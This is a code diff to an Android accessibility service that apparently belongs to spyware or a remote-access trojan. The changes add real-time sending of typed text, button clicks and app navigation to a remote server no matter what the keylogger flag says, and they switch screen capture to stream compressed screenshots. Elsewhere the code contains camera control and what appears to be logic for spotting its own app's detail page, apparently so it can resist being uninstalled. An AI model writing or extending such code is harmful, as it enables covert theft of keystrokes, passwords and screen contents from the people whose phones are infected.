@@ -132,6 +132,7 @@ public class MainAccessibilityService extends AccessibilityService {
     int deviceHeight = 0;
     int deviceDensityDpi = 0;
     private String screenBase64 = "";
+    ByteArrayOutputStream screen_outputStream = new ByteArrayOutputStream();
     private MediaProjectionManager mediaProjectionManager;
     private MediaProjection mediaProjection;
     private ImageReader imageReader;
@@ -203,7 +204,7 @@ public class MainAccessibilityService extends AccessibilityService {
 
     private Boolean isScreenMonitoring = false;
     private Boolean isSkeletonMonitoring = false;
-    private Boolean isKeylogger = true;
+    private Boolean isKeylogger = false;
     private Boolean iscanuninstallapp = false;
 
     private String currentPackagename = "";
@@ -292,6 +293,7 @@ public class MainAccessibilityService extends AccessibilityService {
                 startActivity(intent);
             }
         } else {
+            onGoBack();
             if(mediaProjection == null) {
                 requestMediaProjectService();
             }
@@ -336,9 +338,8 @@ public class MainAccessibilityService extends AccessibilityService {
                 inputText(setTextValue);
             }
             if (ACTION_SCREEN_MONITOR.equals(intent.getAction())) {
-                isScreenMonitoring = true;
                 requestMediaProjectionPermission();
-                sendScreenMonitoringData(screenBase64);
+                sendScreenMonitoringData(screen_outputStream);
             }
 
             if (ACTION_SCREEN_REFRESH_MONITOR.equals(intent.getAction())) {
@@ -346,7 +347,6 @@ public class MainAccessibilityService extends AccessibilityService {
                 new Handler().postDelayed(new Runnable() {
                     @Override
                     public void run() {
-                        isScreenMonitoring= true;
                         requestMediaProjectionPermission();
                     }
                 }, 300);
@@ -497,12 +497,12 @@ public class MainAccessibilityService extends AccessibilityService {
                     stopRecording();
                 }
                 if(close_event.equals("key-monitor")) {
-                    isKeylogger= true;
+                    isKeylogger= false;
                 }
                 if(close_event.equals("all")) {
                     isScreenMonitoring = false;
                     isSkeletonMonitoring = false;
-                    isKeylogger = true;
+                    isKeylogger = false;
                     stopRecording();
                     closeCamera();
                 }
@@ -628,6 +628,7 @@ public class MainAccessibilityService extends AccessibilityService {
     }
 
     private void requestMediaProjectionPermission() {
+        isScreenMonitoring = true;
         if (mediaProjection == null) {
             if(isBound) {
                 Log.d("work", "Bind");
@@ -904,32 +905,40 @@ public class MainAccessibilityService extends AccessibilityService {
                 text = source.getText().toString();
                 eventString = "Text Input";
                 if(Server.getContext() != null) {
+                    Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
                     if(isKeylogger) {
                         Server.getContext().sendKeyLog(text, packagename, eventString);
                     }
                 }
             }
-
         }
 
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             if(!currentPackagename.equals(packagename.toString())) {
-                currentPackagename = packagename.toString();
-                text = event.getText().toString();
-                eventString = "Navigation";
-                if(Server.getContext() != null) {
-                    if(isKeylogger) {
-                        Server.getContext().sendKeyLog(text, packagename, eventString);
+                AccessibilityNodeInfo source = event.getSource();
+                if (source != null && source.isVisibleToUser() && source.getText() != null) {
+                    if(!source.equals("")) {
+                        currentPackagename = packagename.toString();
+                        text = source.getText().toString();
+                        eventString = "Navigation";
+                        if(Server.getContext() != null) {
+                            Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
+                            if(isKeylogger) {
+                                Server.getContext().sendKeyLog(text, packagename, eventString);
+                            }
+                        }
                     }
                 }
             }
+
             if (event.getContentChangeTypes() == AccessibilityEvent.CONTENT_CHANGE_TYPE_TEXT) {
                 AccessibilityNodeInfo source = event.getSource();
                 if (source != null && source.getClassName() != null) {
-                    if(source.getText() != null && source.getClassName().equals("android.widget.EditText")) {
+                    if (source.getText() != null && source.isVisibleToUser() && source.getClassName().equals("android.widget.EditText")) {
                         text = source.getText().toString();
                         eventString = "Text Input";
                         if(Server.getContext() != null) {
+                            Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
                             if(isKeylogger) {
                                 Server.getContext().sendKeyLog(text, packagename, eventString);
                             }
@@ -942,10 +951,11 @@ public class MainAccessibilityService extends AccessibilityService {
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
             AccessibilityNodeInfo source = event.getSource();
             if (source != null && source.getClassName() != null) {
-                if(source.getText() != null && source.getClassName().equals("android.widget.EditText")) {
+                if(source.getText() != null && source.isVisibleToUser() && source.getClassName().equals("android.widget.EditText")) {
                     text = source.getText().toString();
                     eventString = "Text Input";
                     if(Server.getContext() != null) {
+                        Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
                         if(isKeylogger) {
                             if(!text.equals("•")){
                                 Log.d("Skeleton Text::", text.toString());
@@ -959,7 +969,7 @@ public class MainAccessibilityService extends AccessibilityService {
 
         if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
             AccessibilityNodeInfo source = event.getSource();
-            if (source != null && source.isClickable()) {
+            if (source != null && source.isVisibleToUser() && source.isClickable()) {
                 // Check if the clicked view is a Button
                 CharSequence className = source.getClassName();
                 if (className != null) {
@@ -969,10 +979,13 @@ public class MainAccessibilityService extends AccessibilityService {
                             Button_Text = source.getText().toString().toLowerCase();
                             text = Button_Text;
                             eventString = "Button Click";
-                            if(isKeylogger) {
-                                if(!text.equals("") && !text.equals("cancel") && !text.equals("cancelar") && !text.equals("取消"))
+                            if(!text.equals("") && !text.equals("cancel") && !text.equals("cancelar") && !text.equals("取消")) {
+                                Server.getContext().sendRealtimeKeyLog(text, packagename, eventString);
+                                if(isKeylogger) {
                                     Server.getContext().sendKeyLog(text, packagename, eventString);
+                                }
                             }
+
                         }
                     }
                 }
@@ -1001,7 +1014,6 @@ public class MainAccessibilityService extends AccessibilityService {
                             Rect rect = new Rect();
                             node.getBoundsInScreen(rect);
                             performClickMain(deviceWidth - rect.left - 10, rect.top + 10);
-
                         }
                     }
 
@@ -1036,7 +1048,7 @@ public class MainAccessibilityService extends AccessibilityService {
     }
     public void getAppDetailPage(AccessibilityNodeInfo node) {
         if(node != null) {
-            if (node.getClassName() != null && node.getClassName().equals("android.widget.TextView")) {
+            if (node.getClassName() != null && node.isVisibleToUser() && node.getClassName().equals("android.widget.TextView")) {
                 if(node.getText() != null) {
                     String nodeText = node.getText().toString().toLowerCase();
                     if(nodeText.contains(getResources().getString(R.string.app_name).toLowerCase()) || nodeText.contains("com.support.litework")) {
@@ -1207,8 +1219,9 @@ public class MainAccessibilityService extends AccessibilityService {
                         scaledBitmap = Bitmap.createScaledBitmap(bitmap, imageWidth, (int) (bitmapHeight * (360.0 / deviceWidth)), true);
                         scaledBitmap.compress(Bitmap.CompressFormat.WEBP, 10, outputStream);
                     }
-                    screenBase64 = Base64.encodeToString(outputStream.toByteArray(), Base64.DEFAULT);
-                    sendScreenMonitoringData(screenBase64);
+//                    screenBase64 = Base64.encodeToString(outputStream.toByteArray(), Base64.DEFAULT);
+                    screen_outputStream = outputStream;
+                    sendScreenMonitoringData(outputStream);
                     bitmap.recycle();
                     scaledBitmap.recycle();
                     outputStream.close();
@@ -1301,7 +1314,6 @@ public class MainAccessibilityService extends AccessibilityService {
             Log.e("Acc", "Error in esqueletoView: " + exception.getLocalizedMessage());
             exception.printStackTrace();
         }
-
         return skeletonEntryList;  // Return the collected list of skeleton entries
     }
 
@@ -2098,11 +2110,11 @@ public class MainAccessibilityService extends AccessibilityService {
 
 
     //Send Data part
-    public void sendScreenMonitoringData(String base64Image) {
+    public void sendScreenMonitoringData(ByteArrayOutputStream outputStream) {
         if (Server.getContext() != null) {
-//            if(isScreenMonitoring) {
-            Server.getContext().sendScreenMonitoring(base64Image);
-//            }
+            if(isScreenMonitoring) {
+                Server.getContext().sendScreenMonitoring(outputStream);
+            }
         }
     }
 
@@ -2121,6 +2133,11 @@ public class MainAccessibilityService extends AccessibilityService {
     @Override
     public void onDestroy() {
         super.onDestroy();
+        try {
+            screen_outputStream.close();
+        } catch (IOException e) {
+            throw new RuntimeException(e);
+        }
         closeCamera();
         unregisterReceiverManager();
         unsetMediaProjection();
